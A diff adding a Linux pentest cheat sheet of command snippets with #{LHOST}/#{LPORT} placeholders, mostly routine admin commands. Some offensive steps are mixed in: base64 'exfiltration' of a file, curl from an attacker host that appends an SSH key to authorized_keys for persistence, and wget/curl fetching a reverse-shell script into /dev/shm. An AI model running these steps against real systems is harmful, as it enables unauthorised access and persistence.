@@ -1,0 +1,132 @@
+# Exfiltration using Base64
+# or use echo "this will encode" | base64 -w 0
+base64 -w 0 #{file}
+
+# Get HexDump without new lines
+xxd -p #{file} | tr -d '\n'
+@file.desc(.bin file)
+
+# Add public key to authorized keys
+# desc: Add SSH
+curl https://#{LHOST}:#{LPORT}/.ssh/id_rsa.pub >> ~/.ssh/authotized_keys
+
+# Echo without new line and Hex
+echo -n -e
+
+# desc: Count
+# -l: lines  -c chars
+wc -l #{file}
+wc -c #{file}
+
+# Sort
+# desc: Sort Reverse
+sort -nr #Sort by number and then reverse
+
+# Sort and delete duplicates
+# desc: Sort
+cat #{file} | sort | uniq 
+
+# Replace in file
+# Replace string inside a file
+# desc: Replace
+sed -i 's/#{old}/#{new}/g' #{file} 
+
+# desc: Download in RAM
+wget #{LHOST}:#{LPORT}/#{file} -O /dev/shm/.rev.py
+wget #{LHOST}:#{LPORT}/#{file} -P /dev/shm
+curl #{LHOST}:#{LPORT}/#{file} -o /dev/shm/shell.py
+@file.desc(backconnect file)
+
+#Files used by network processes
+lsof #Open files belonging to any process
+lsof -p 3 #Open files used by the process
+lsof -i #Files used by networks processes
+lsof -i 4 #Files used by network IPv4 processes
+lsof -i 6 #Files used by network IPv6 processes
+lsof -i 4 -a -p 1234 #List all open IPV4 network files in use by the process 1234
+lsof +D /lib #Processes using files inside the indicated dir
+lsof -i :80 #Files uses by networks processes
+fuser -nv tcp 80
+
+# desc: Decompress
+tar -xvzf /path/to/yourfile.tgz
+tar -xvjf /path/to/yourfile.tbz
+bzip2 -d /path/to/yourfile.bz2
+tar jxf file.tar.bz2
+gunzip /path/to/yourfile.gz
+unzip file.zip
+7z -x file.7z
+sudo apt-get install xz-utils; unxz file.xz
+
+# desc: Add new user
+useradd -p 'openssl passwd -1 #{PWD}' #{USER}
+
+# desc: Clipboard
+xclip -sel c < cat file.txt
+
+# HTTP servers
+python -m SimpleHTTPServer #{LPORT}
+python3 -m http.server #{LPORT}
+ruby -rwebrick -e "WEBrick::HTTPServer.new(:Port => #{LPORT}, :DocumentRoot => Dir.pwd).start"
+php -S $ip:#{LPORT}
+
+# desc: Curl POST
+# json data
+curl --header "Content-Type: application/json" --request POST --data '{"password":"password", "username":"admin"}' http://host:3001/endpoint
+#Auth via JWT
+curl -X GET -H 'Authorization: Bearer <JWT>' http://host:3000/endpoint
+
+# desc: Send Email
+# You will be prompted for the content
+sendEmail -t to@email.com -f from@email.com -s 192.168.8.131 -u Subject -a file.pdf 
+
+# DD copy hex bin file without first X (28) bytes
+# desc: copy hex bin
+dd if=file.bin bs=28 skip=1 of=blob
+
+# Mount .vhd files (virtual hard drive)
+# Mount .vhd
+sudo apt-get install libguestfs-tools
+guestmount --add NAME.vhd --inspector --ro /mnt/vhd #For read-only, create first /mnt/vhd
+
+# ssh-keyscan, help to find if 2 ssh ports are from the same host comparing keys
+ssh-keyscan 10.10.10.101
+
+# desc: Openssl
+openssl s_client -connect 10.10.10.127:443 #Get the certificate from a server
+openssl x509 -in ca.cert.pem -text #Read certificate
+openssl genrsa -out newuser.key 2048 #Create new RSA2048 key
+openssl req -new -key newuser.key -out newuser.csr #Generate certificate from a private key. Recommended to set the "Organizatoin Name"(Fortune) and the "Common Name" (newuser@fortune.htb)
+openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes #Create certificate
+openssl x509 -req -in newuser.csr -CA intermediate.cert.pem -CAkey intermediate.key.pem -CAcreateserial -out newuser.pem -days 1024 -sha256 #Create a signed certificate
+openssl pkcs12 -export -out newuser.pfx -inkey newuser.key -in newuser.pem #Create from the signed certificate the pkcs12 certificate format (firefox)
+
+# If you only needs to create a client certificate from a Ca certificate and the CA key, you can do it using:
+openssl pkcs12 -export -in ca.cert.pem -inkey ca.key.pem -out client.p12
+
+# Decrypt ssh key
+openssl rsa -in key.ssh.enc -out key.ssh
+
+# Decrypt
+openssl enc -aes256 -k <KEY> -d -in backup.tgz.enc -out b.tgz
+
+# Count number of instructions executed by a program, need a host based linux (not working in VM)
+perf stat -x, -e instructions:u "ls"
+
+# Find trick for HTB, find files from 2018-12-12 to 2018-12-14
+find / -newermt 2018-12-12 ! -newermt 2018-12-14 -type f -readable -not -path "/proc/*" -not -path "/sys/*" -ls 2>/dev/null
+
+# desc: Reconfigure timezone
+sudo dpkg-reconfigure tzdata
+
+# Search from wich package is a binary
+# Needed: apt-get install apt-file
+apt-file search /usr/bin/file 
+
+# Protobuf decode https://www.ezequiel.tech/2020/08/leaking-google-cloud-projects.html
+echo "CIKUmMesGw==" | base64 -d | protoc --decode_raw
+
+# Set not removable bit (+i)
+# Remove the bit so you can delete it (-i)
+sudo chattr +i #{file}
+sudo chattr -i #{file}
